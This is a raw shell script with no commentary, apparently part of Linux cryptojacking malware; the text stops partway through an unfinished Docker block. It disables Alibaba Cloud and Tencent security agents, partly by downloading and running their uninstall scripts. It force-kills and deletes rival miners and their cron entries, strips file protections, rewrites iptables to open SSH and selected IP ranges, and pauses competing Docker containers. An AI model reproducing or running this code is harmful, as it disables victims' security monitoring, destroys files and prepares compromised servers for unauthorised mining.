#!/bin/sh
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

pkill barad_agent*
pkill anat*
if ps aux|grep -v defunct|grep -i '[a]liyun'; then
curl --retry 2 --connect-timeout 26 --max-time 75 -fsSLk http://update.aegis.aliyun.com/download/uninstall.sh -o /tmp/u1.sh||wget --tries=2 --connect-timeout=26 --timeout=75 --no-check-certificate -qO- http://update.aegis.aliyun.com/download/uninstall.sh -O /dev/shm/u1.sh
chmod +x /dev/shm/u1.sh
$SHELL /dev/shm/u1.sh
curl --retry 2 --connect-timeout 26 --max-time 75 -fsSLk http://update.aegis.aliyun.com/download/quartz_uninstall.sh -o /tmp/u2.sh||wget --tries=2 --connect-timeout=26 --timeout=75 --no-check-certificate -qO- http://update.aegis.aliyun.com/download/quartz_uninstall.sh -O /dev/shm/u2.sh
chmod +x /dev/shm/u2.sh
$SHELL /dev/shm/u2.sh
pkill aliyun-service 2>/dev/null
rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service /dev/shm/u1.sh /dev/shm/u2.sh
rm -rf /usr/local/aegis*
elif ps aux|grep -v defunct|grep -i '[y]unjing'; then
${sudo} /usr/local/qcloud/stargate/admin/uninstall.sh
${sudo} /usr/local/qcloud/YunJing/uninst.sh
${sudo} /usr/local/qcloud/monitor/barad/admin/uninstall.sh
fi

pkill -9 -f "8220|aegis_|AliYunDun|AliHids|autom.sh|AliYunDunUpdate|aliyun-service|log_rot|cr.sh|cryptonight|ddgs|fs-manager|/nginx|hashfish|hwlh3wlh44lh|java-c|kerberods|/mysql|kworkerds|kpsmouseds|kthrotlds|mewrs|miner|pythno|mr.sh|muhsti|mygit|orgfs|qW3xT|qwefdas|stratum|sustes|.systemd-analyze|t00ls|thisxxs|/tmp/ddgs|/tmp/java|.skel|/tmp/udevs|/tmp/yarn|/usr/local/share/git/git|/usr/bin/netfs|watchbog|wipefs|wnTKYg|xig|xmr|zer0|biosetjenkins|Loopback|apaceha|cryptonight|stratum|mixnerdx|performedl|JnKihGjn|irqba2anc1|irqba5xnc1|irqbnc1|ir29xc1|conns|irqbalance|crypto-pool|XJnRj|mgwsl|pythno|jweri|lx26|NXLAi|BI5zj|askdljlqw|minerd|minergate|Guard.sh|ysaydh|bonns|sbin/havaged|donns|kxjd|Duck.sh|bonn.sh|conn.sh|kworker34|kw.sh|pro.sh|polkitd|acpid|icb5o|nopxi|irqbalanc1|minerd|i586|gddr|mstxmr|ddg.2011|wnTKYg|deamon|disk_genius|sourplum|/usr/sbin/havaged|polkitd|nanoWatch|zigw|devtool|devtools|/bin/dockerswarm|systemctI|watchbog|cryptonight|sustes|xmrig|xmr-stak|suppoie|zer0day.ru|dbus-daemon--system|nullcrew|systemctI|kworkerds|init10.cfg|/wl.conf|crond64|sustse|vmlinuz|/usr/bin/aliynd-upd-service|barad_agent|./log_rot|aliund-upd|/var/tmp/sic/sic|/tmp/keys|1998031717110197872661421412511919214259482409521655|./apachi|systemd-host"

ps aux | grep '192.99.142.226\|82.146.58.234\|83.220.169.247\|51.68.173.240\|91.201.42.5|176.31.6.16' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'kworkerdssx -c\' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'netns' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'voltuned' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'darwin' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '/tmp/dl' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '/tmp/ddg' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '/tmp/pprt' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '/tmp/ppol' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '/tmp/65ccEJ7\' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '/tmp/jmxx\' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '/tmp/2Ne80nA\' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'IOFoqIgyC0zmf2UR'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '45.76.122.92'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '51.38.191.178'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '51.15.56.161'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '86s.jpg'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'aGTSGJJp'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'nMrfmnRa'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'PuNY5tm2'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'I0r8Jyyt'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'AgdgACUD'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'uiZvwxG8'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'hahwNEdB'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'BtwXn5qH'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '3XEzey2T'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 't2tKrCSZ'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'HD7fcBgg'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'zXcDajSs'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '3lmigMo'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'AkMK4A2'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'AJ2AkKe'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'HiPxCJRS'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'http_0xCC030'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'http_0xCC031'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'http_0xCC032'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'http_0xCC033'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep "C4iLM4L"| awk '{print $2}'| xargs -r kill -9
ps aux | grep -v grep | grep 'aziplcr72qjhzvin'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | awk '{ if(substr($11,1,2)=="./" && substr($12,1,2)=="./") print $2 }' | xargs -r kill -9
ps aux | grep -v grep | grep '/boot/vmlinuz'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep "i4b503a52cc5"| awk '{print $2}'|xargs -r kill -9
ps aux | grep -v grep | grep "dgqtrcst23rtdi3ldqk322j2"| awk '{print $2}'|xargs -r kill -9
ps aux | grep -v grep | grep "2g0uv7npuhrlatd"| awk '{print $2}'|xargs -r kill -9
ps aux | grep -v grep | grep "nqscheduler"| awk '{print $2}'| xargs -r kill -9
ps aux | grep -v grep | grep "rkebbwgqpl4npmm"| awk '{print $2}'| xargs -r kill -9
ps aux | grep -v grep | grep -v aux |grep "]"| awk '$3>10.0{print $2}'| xargs -r kill -9
ps aux | grep -v grep | grep "2fhtu70teuhtoh78jc5s"| awk '{print $2}'| xargs -r kill -9
ps aux | grep -v grep | grep "0kwti6ut420t"| awk '{print $2}'| xargs -r kill -9
ps aux | grep -v grep | grep "44ct7udt0patws3agkdfqnjm"| awk '{print $2}'| xargs -r kill -9
ps aux | grep -v grep | grep -v "/" | grep -v "-" | grep -v "_" | awk 'length($11)>19{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep  '\[^' | awk '{print $2}'| xargs -r kill -9
ps aux | grep -v grep | grep "rsync" | awk '{print $2}'| xargs -r kill -9
ps aux | grep -v grep | grep "watchd0g" | awk '{print $2}'| xargs -r kill -9
ps aux | grep -v grep | grep -E 'wnTKYg|2t3ik|qW3xT.2|ddg' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep "158.69.133.18:8220"| awk '{print $2}'| xargs -r kill -9
ps aux | grep -v grep | grep '/tmp/java' | awk '{print $2}'| xargs -r kill -9
ps aux | grep -v grep | grep 'gitee.com'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '/tmp/java' | awk '{print $2}'| xargs -r kill -9
ps aux | grep -v grep | grep '104.248.4.162'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '89.35.39.78'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '/dev/shm/z3.sh'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'kthrotlds' | awk '{print $2}'| xargs -r kill -9
ps aux | grep -v grep | grep 'ksoftirqds' | awk '{print $2}'| xargs -r kill -9
ps aux | grep -v grep | grep 'netdns' | awk '{print $2}'| xargs -r kill -9
ps aux | grep -v grep | grep 'watchdogs' | awk '{print $2}'| xargs -r kill -9
ps aux | grep -v grep | grep -v aux | grep " ps"| awk '{print $2}'| xargs -r kill -9
ps aux | grep -v grep | grep "sync_supers" | cut -c 9-15 | xargs -r kill -9
ps aux | grep -v grep | grep "cpuset" | cut -c 9-15 | xargs -r kill -9
ps aux | grep -v grep | grep -v aux |grep "x]"| awk '{print $2}'| xargs -r kill -9
ps aux | grep -v grep | grep -v aux |grep "sh] <"| awk '{print $2}'| xargs -r kill -9
ps aux | grep -v grep | grep -v aux |grep ' \[]'| awk '{print $2}'| xargs -r kill -9
ps aux | grep -v grep | grep '/tmp/l.sh'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '/tmp/zmcat' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'hahwNEdB'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'CnzFVPLF'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'CvKzzZLs'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'aziplcr72qjhzvin'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '/tmp/udevd'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'KCBjdXJsIC1vIC0gaHR0cDovLzg5LjIyMS41Mi4xMjIvcy5zaCApIHwgYmFzaCA' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'Y3VybCAtcyBodHRwOi8vMTA3LjE3NC40Ny4xNTYvbXIuc2ggfCBiYXNoIC1zaAo' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'sustse'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'sustse3'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'mr.sh'| grep 'wget'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'mr.sh'| grep 'curl'| awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '2mr.sh'| grep 'wget' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '2mr.sh'| grep 'curl' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'cr5.sh'| grep 'wget' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'cr5.sh'| grep 'curl' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'logo9.jpg' | grep 'wget' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'logo9.jpg' | grep 'curl' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'j2.conf' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'luk-cpu' | grep 'wget' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'luk-cpu' | grep 'curl' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'ficov' | grep 'wget' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'ficov' | grep 'curl' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'he.sh' | grep 'wget' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'he.sh' | grep 'curl' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'miner.sh' | grep 'wget' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'miner.sh' | grep 'curl' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'nullcrew' | grep 'wget' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep 'nullcrew' | grep 'curl' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '107.174.47.156' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '83.220.169.247' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '51.38.203.146' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '144.217.45.45' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '107.174.47.181' | awk '{print $2}' | xargs -r kill -9
ps aux | grep -v grep | grep '176.31.6.16' | awk '{print $2}' | xargs -r kill -9
ps auxf| grep -v grep | grep "mine.moneropool.com"|awk '{print $2}'|xargs -r kill -9
ps auxf| grep -v grep | grep "pool.t00ls.ru"|awk '{print $2}'|xargs -r kill -9
ps auxf| grep -v grep | grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs -r kill -9
ps auxf| grep -v grep | grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs -r kill -9
ps auxf| grep -v grep | grep "zhuabcn@yahoo.com"|awk '{print $2}'|xargs -r kill -9
ps auxf| grep -v grep | grep "monerohash.com"|awk '{print $2}'|xargs -r kill -9
ps auxf| grep -v grep | grep "/tmp/a7b104c270"|awk '{print $2}'|xargs -r kill -9
ps auxf| grep -v grep | grep "xmr.crypto-pool.fr:6666"|awk '{print $2}'|xargs -r kill -9
ps auxf| grep -v grep | grep "xmr.crypto-pool.fr:7777"|awk '{print $2}'|xargs -r kill -9
ps auxf| grep -v grep | grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs -r kill -9
ps auxf| grep -v grep | grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs -r kill -9
ps auxf| grep -v grep | grep "xmrpool.eu" | awk '{print $2}'|xargs -r kill -9
ps auxf| grep -v grep | grep "xiaoyao" | awk '{print $2}'|xargs -r kill -9
ps auxf| grep -v grep | grep "xiaoxue" | awk '{print $2}'|xargs -r kill -9
netstat -antp | grep '46.243.253.15' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e 's/\/.*//g' | xargs -r kill -9
netstat -antp | grep '176.31.6.16' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e 's/\/.*//g' | xargs -r kill -9
pgrep -f monerohash|xargs -r kill -9
pgrep -f L2Jpbi9iYXN|xargs -r kill -9
pgrep -f xzpauectgr|xargs -r kill -9
pgrep -f slxfbkmxtd|xargs -r kill -9
pgrep -f mixtape|xargs -r kill -9
pgrep -f addnj|xargs -r kill -9
pgrep -f 200.68.17.196|xargs -r kill -9
pgrep -f IyEvYmluL3NoCgpzUG|xargs -r kill -9
pgrep -f KHdnZXQgLXFPLSBodHRw|xargs -r kill -9
pgrep -f FEQ3eSp8omko5nx9e97hQ39NS3NMo6rxVQS3|xargs -r kill -9
pgrep -f Y3VybCAxOTEuMTAxLjE4MC43Ni9saW4udHh0IHxzaAo|xargs -r kill -9
pgrep -f mwyumwdbpq.conf|xargs -r kill -9
pgrep -f honvbsasbf.conf|xargs -r kill -9
pgrep -f mqdsflm.cf|xargs -r kill -9
pgrep -f stratum|xargs -r kill -9
pgrep -f lower.sh|xargs -r kill -9
pgrep -f ./ppp|xargs -r kill -9
pgrep -f cryptonight|xargs -r kill -9
pgrep -f ./seervceaess|xargs -r kill -9
pgrep -f ./servceaess|xargs -r kill -9
pgrep -f ./servceas|xargs -r kill -9
pgrep -f ./servcesa|xargs -r kill -9
pgrep -f ./vsp|xargs -r kill -9
pgrep -f ./jvs|xargs -r kill -9
pgrep -f ./pvv|xargs -r kill -9
pgrep -f ./vpp|xargs -r kill -9
pgrep -f ./pces|xargs -r kill -9
pgrep -f ./rspce|xargs -r kill -9
pgrep -f ./haveged|xargs -r kill -9
pgrep -f ./jiba|xargs -r kill -9
pgrep -f ./watchbog|xargs -r kill -9
pgrep -f ./A7mA5gb|xargs -r kill -9  
pgrep -f kacpi_svc|xargs -r kill -9
pgrep -f kswap_svc|xargs -r kill -9
pgrep -f kauditd_svc|xargs -r kill -9
pgrep -f kpsmoused_svc|xargs -r kill -9
pgrep -f kseriod_svc|xargs -r kill -9
pgrep -f kthreadd_svc|xargs -r kill -9
pgrep -f ksoftirqd_svc|xargs -r kill -9
pgrep -f kintegrityd_svc|xargs -r kill -9
pgrep -f jawa|xargs -r kill -9
pgrep -f oracle.jpg|xargs -r kill -9
pgrep -f 45cToD1FzkjAxHRBhYKKLg5utMGEN|xargs -r kill -9
pgrep -f 188.209.49.54|xargs -r kill -9
pgrep -f 181.214.87.241|xargs -r kill -9
pgrep -f etnkFgkKMumdqhrqxZ6729U7bY8pzRjYzGbXa5sDQ|xargs -r kill -9
pgrep -f 47TdedDgSXjZtJguKmYqha4sSrTvoPXnrYQEq2Lbj|xargs -r kill -9
pgrep -f etnkP9UjR55j9TKyiiXWiRELxTS51FjU9e1UapXyK|xargs -r kill -9
pgrep -f servim|xargs -r kill -9
pgrep -f kblockd_svc|xargs -r kill -9
pgrep -f native_svc|xargs -r kill -9
pgrep -f ynn|xargs -r kill -9
pgrep -f perl|xargs -r kill -9
pgrep -f 65ccEJ7|xargs -r kill -9
pgrep -f jmxx|xargs -r kill -9
pgrep -f 2Ne80nA|xargs -r kill -9
pgrep -f sysstats|xargs -r kill -9
pgrep -f systemxlv|xargs -r kill -9
pgrep -f watchbog|xargs -r kill -9
pgrep -f OIcJi1m|xargs -r kill -9
pgrep -f ./log_rot|xargs -r kill -9
pgrep -f aliynd-upd-service|xargs -r kill -9
pgrep -f uiC5HSaS.sh|xargs -r kill -9
pgrep -f .config-err|xargs -r kill -9
pgrep -f ./apachi|xargs -r kill -9

chattr -aui /tmp/wc.conf /tmp/sustse /tmp/php /tmp/p2.conf /tmp/pprt /tmp/ppol /tmp/javax/config.sh /tmp/javax/sshd2 /tmp/.profile /tmp/1.so /tmp/kworkerds /tmp/kworkerds3 /tmp/kworkerdssx /tmp/xd.json /tmp/syslogd /tmp/syslogdb /tmp/65ccEJ7 /tmp/jmxx /tmp/2Ne80nA /tmp/dl /tmp/ddg /tmp/systemxlv /tmp/systemctI /tmp/.abc /tmp/osw.hb /tmp/.tmpleve /tmp/.tmpnewzz /tmp/.java /tmp/.omed /tmp/.tmpc /tmp/.tmpleve /tmp/.tmpnewzz /tmp/gates.lod /tmp/conf.n /tmp/update.sh /tmp/devtool/tmp/devtools /tmp/fs /tmp/.rod /tmp/.rod.tgz /tmp/.rod.tgz.1 /tmp/.rod.tgz.2 /tmp/.mer /tmp/.mer.tgz /tmp/.mer.tgz.1 /tmp/.hod /tmp/.hod.tgz /tmp/.hod.tgz.1 /tmp/84Onmce /tmp/C4iLM4L /tmp/lilpip /usr/sbin/havaged /tmp/3lmigMo /tmp/am8jmBP /tmp/tmp.txt /tmp/baby /tmp/.lib /tmp/systemd /tmp/lib.tar.gz /tmp/baby /tmp/java /tmp/j2.conf /tmp/.mynews1234 /tmp/a3e12d /tmp/.pt /tmp/.pt.tgz /tmp/.pt.tgz.1 /tmp/go /tmp/java /tmp/j2.conf /tmp/.tmpnewasss /tmp/java /tmp/go.sh /tmp/go2.sh /tmp/khugepageds /tmp/.censusqqqqqqqqq /tmp/.kerberods /tmp/kerberods /tmp/seasame /tmp/touch /tmp/.p /tmp/runtime2.sh /tmp/runtime.sh /dev/shm/z3.sh /dev/shm/z2.sh /dev/shm/.scr /dev/shm/.kerberods /tmp/watchdogs /etc/cron.d/tomcat /usr/sbin/rpm-check /bin/dockerswarm /etc/cron.hourly/rpm /var/log/yum-cache.log /var/spool/crond /bin/sysv-init /usr/sbin/ids /bin/addres /usr/local/share/xenial /etc/rc.d/init.d/watchdogs /usr/sbin/watchdogs /tmp/.sysbabyuuuuu12 /tmp/logo9.jpg /tmp/miner.sh /tmp/nullcrew /tmp/proc /tmp/2.sh /var/tmp/f41 /usr/sbin/havaged /var/tmp/2.sh /var/tmp/config.json /var/tmp/xmrig /var/tmp/1.so /var/tmp/kworkerds3 /var/tmp/kworkerdssx /var/tmp/kworkerds /var/tmp/wc.conf /var/tmp/nadezhda. /var/tmp/nadezhda.arm /var/tmp/nadezhda.arm.1 /var/tmp/nadezhda.arm.2 /var/tmp/nadezhda.x86_64 /var/tmp/nadezhda.x86_64.1 /var/tmp/nadezhda.x86_64.2 /var/tmp/sustse3 /var/tmp/sustse /var/tmp/moneroocean/ /var/tmp/devtool /var/tmp/devtools /var/tmp/play.sh /var/tmp/systemctI /var/tmp/update.sh /var/tmp/.java /var/tmp/1.sh /var/tmp/conf.n /etc/config.json /etc/.skel /autom.sh /tmp/log_rot /tmp/1 /tcm/.c /tmp/cron /usr/sbin/scoutd /etc/cron.d/1m /etc/cron.d/root /etc/cron.d/crontab /tmp/Circle_CF.png /tmp/kcore /tmp/BoomBoom /usr/bin/ntpd /usr/bin/aliynd-upd-service /tmp/uiC5HSaS.sh .config-err /etc/init.d/agentwatch /usr/sbin/aliyun-service /var/tmp/cache.1 /var/tmp/cache.2 /var/tmp/cache.3 /etc/cron.hourly/unattended-upgrades /etc/cron.d/php5.3 /var/tmp/.swapfile /var/tmp/systemd-private-f614508160cc43ae8aabb0ddc246f2a6-chronyd.service-hQrIh3/.lock /var/tmp/systemd-private-f614508160cc43ae8aabb0ddc246f2a6-chronyd.service-hQrIh3 /var/tmp/aliyun_assist_update.lock /.c /etc/cron.hourly/crond /usr/bin/aliund-upd-service /usr/bin/aliynd-upd-check /var/tmp/.config-err /usr/bin/symcfget /var/tmp/sic/sic /tmp/keys /tmp/lok /etc/cron.d/1mm /etc/cron.d/1mmm /usr/local/aegis/aegis_client/aegis_10_73/AliYunDun /usr/local/aegis/aegis_update/AliYunDunUpdate /usr/bin/aliynd-upd-service /usr/local/aegis/aegis_client/aegis_10_69/AliYunDun /usr/local/aegis/aegis_update/AliYunDunUpdate /usr/lib/systemd/bin/systemd-host /usr/lib/systemd/bin/ /usr/bin/.ld /usr/lib/libc.so.8

rm -rf /tmp/wc.conf /tmp/sustse /tmp/php /tmp/p2.conf /tmp/pprt /tmp/ppol /tmp/javax/config.sh /tmp/javax/sshd2 /tmp/.profile /tmp/1.so /tmp/kworkerds /tmp/kworkerds3 /tmp/kworkerdssx /tmp/xd.json /tmp/syslogd /tmp/syslogdb /tmp/65ccEJ7 /tmp/jmxx /tmp/2Ne80nA /tmp/dl /tmp/ddg /tmp/systemxlv /tmp/systemctI /tmp/.abc /tmp/osw.hb /tmp/.tmpleve /tmp/.tmpnewzz /tmp/.java /tmp/.omed /tmp/.tmpc /tmp/.tmpleve /tmp/.tmpnewzz /tmp/gates.lod /tmp/conf.n /tmp/update.sh /tmp/devtool/tmp/devtools /tmp/fs /tmp/.rod /tmp/.rod.tgz /tmp/.rod.tgz.1 /tmp/.rod.tgz.2 /tmp/.mer /tmp/.mer.tgz /tmp/.mer.tgz.1 /tmp/.hod /tmp/.hod.tgz /tmp/.hod.tgz.1 /tmp/84Onmce /tmp/C4iLM4L /tmp/lilpip /usr/sbin/havaged /tmp/3lmigMo /tmp/am8jmBP /tmp/tmp.txt /tmp/baby /tmp/.lib /tmp/systemd /tmp/lib.tar.gz /tmp/baby /tmp/java /tmp/j2.conf /tmp/.mynews1234 /tmp/a3e12d /tmp/.pt /tmp/.pt.tgz /tmp/.pt.tgz.1 /tmp/go /tmp/java /tmp/j2.conf /tmp/.tmpnewasss /tmp/java /tmp/go.sh /tmp/go2.sh /tmp/khugepageds /tmp/.censusqqqqqqqqq /tmp/.kerberods /tmp/kerberods /tmp/seasame /tmp/touch /tmp/.p /tmp/runtime2.sh /tmp/runtime.sh /dev/shm/z3.sh /dev/shm/z2.sh /dev/shm/.scr /dev/shm/.kerberods /tmp/watchdogs /etc/cron.d/tomcat /usr/sbin/rpm-check /bin/dockerswarm /etc/cron.hourly/rpm /var/log/yum-cache.log /var/spool/crond /bin/sysv-init /usr/sbin/ids /bin/addres /usr/local/share/xenial /etc/rc.d/init.d/watchdogs /usr/sbin/watchdogs /tmp/.sysbabyuuuuu12 /tmp/logo9.jpg /tmp/miner.sh /tmp/nullcrew /tmp/proc /tmp/2.sh /var/tmp/f41 /usr/sbin/havaged /var/tmp/2.sh /var/tmp/config.json /var/tmp/xmrig /var/tmp/1.so /var/tmp/kworkerds3 /var/tmp/kworkerdssx /var/tmp/kworkerds /var/tmp/wc.conf /var/tmp/nadezhda. /var/tmp/nadezhda.arm /var/tmp/nadezhda.arm.1 /var/tmp/nadezhda.arm.2 /var/tmp/nadezhda.x86_64 /var/tmp/nadezhda.x86_64.1 /var/tmp/nadezhda.x86_64.2 /var/tmp/sustse3 /var/tmp/sustse /var/tmp/moneroocean/ /var/tmp/devtool /var/tmp/devtools /var/tmp/play.sh /var/tmp/systemctI /var/tmp/update.sh /var/tmp/.java /var/tmp/1.sh /var/tmp/conf.n /etc/config.json /etc/.skel /autom.sh /tmp/log_rot /tmp/1 /tcm/.c /tmp/cron /usr/sbin/scoutd /etc/cron.d/1m /etc/cron.d/root /etc/cron.d/crontab /tmp/Circle_CF.png /tmp/kcore /tmp/BoomBoom /usr/bin/ntpd /usr/bin/aliynd-upd-service /tmp/uiC5HSaS.sh .config-err /etc/init.d/agentwatch /usr/sbin/aliyun-service /var/tmp/cache.1 /var/tmp/cache.2 /var/tmp/cache.3 /etc/cron.hourly/unattended-upgrades /etc/cron.d/php5.3 /var/tmp/.swapfile /var/tmp/systemd-private-f614508160cc43ae8aabb0ddc246f2a6-chronyd.service-hQrIh3/.lock /var/tmp/systemd-private-f614508160cc43ae8aabb0ddc246f2a6-chronyd.service-hQrIh3 /var/tmp/aliyun_assist_update.lock /.c /etc/cron.hourly/crond /usr/bin/aliund-upd-service /usr/bin/aliynd-upd-check /var/tmp/.config-err /usr/bin/symcfget /var/tmp/sic/sic /tmp/keys /tmp/lok /etc/cron.d/1mm /etc/cron.d/1mmm /usr/local/aegis/aegis_client/aegis_10_73/AliYunDun /usr/local/aegis/aegis_update/AliYunDunUpdate /usr/bin/aliynd-upd-service /usr/local/aegis/aegis_client/aegis_10_69/AliYunDun /usr/local/aegis/aegis_update/AliYunDunUpdate /usr/lib/systemd/bin/ /usr/bin/.ld /usr/lib/libc.so.8

chattr -aui /etc/ld.so.preload /usr/local/lib/libioset.so /tmp/kthrotlds /etc/rc.d/init.d/kthrotlds /opt/atlassian/confluence/bin/1.sh /opt/atlassian/confluence/bin/1.sh.1 /opt/atlassian/confluence/bin/1.sh.2 /opt/atlassian/confluence/bin/1.sh.3 /opt/atlassian/confluence/bin/3.sh /opt/atlassian/confluence/bin/3.sh.1 /opt/atlassian/confluence/bin/3.sh.2 /opt/atlassian/confluence/bin/3.sh.3
rm -r /var/tmp/lib /var/tmp/.lib

rm -f /etc/ld.so.preload /usr/local/lib/libioset.so /tmp/kthrotlds /etc/rc.d/init.d/kthrotlds /opt/atlassian/confluence/bin/1.sh /opt/atlassian/confluence/bin/1.sh.1 /opt/atlassian/confluence/bin/1.sh.2 /opt/atlassian/confluence/bin/1.sh.3 /opt/atlassian/confluence/bin/3.sh /opt/atlassian/confluence/bin/3.sh.1 /opt/atlassian/confluence/bin/3.sh.2 /opt/atlassian/confluence/bin/3.sh.3 
rm -r /var/tmp/lib /var/tmp/.lib

pkill -9 -f "AliYunDun|sic/sic|apachi|systemd-host"

iptables -S INPUT|grep 2375|cut -d" " -f2-|xargs -rL1 iptables -D
iptables -S INPUT|grep 37.187|cut -d" " -f2-|xargs -rL1 iptables -D
iptables -S INPUT|grep 37.59|cut -d" " -f2-|xargs -rL1 iptables -D
iptables -S INPUT|grep 88.99|cut -d" " -f2-|xargs -rL1 iptables -D
iptables -I INPUT ! -i lo -p tcp -m tcp --dport 2375 -j DROP
iptables -S INPUT|grep 22|cut -d" " -f2-|xargs -rL1 iptables -D
iptables -I INPUT -p tcp -m tcp --dport 22 -j ACCEPT
iptables -I INPUT -d 37.187.0.0/12,37.59.0.0/12,88.99.0.0/12 -j ACCEPT
iptables -P OUTPUT ACCEPT
iptables -P FORWARD ACCEPT

if [ "$(command -v docker|wc -l)" -ne 0 ]; then
docker ps --no-trunc|grep -E '(echo azulu|auto|xmr|ocean|monero|mine|pastebin|busybox|cryptonight|slowhttptest|helloworld|dockerminer|xmr-stak|[sS]tratum|sbin|xmrig|xmrdemo|/nginx|gakeaws|oceanhole|curl|wget|pocosow|chroot|rent@secmail.pro|minergate|\s+-u etn|\s+-u Sumo)'|awk '{print $1}'|xargs -r docker pause
ps uxww|awk '/minergate|nodjs|rent@secmail.pro|xmrig|crond|init/ {print $2}'|xargs -r -n1 -I "{}" cat "/proc/{}/cgroup" 2>|awk -F '/cpu/ {print $NF}'|sort -u|xargs -r docker pause 
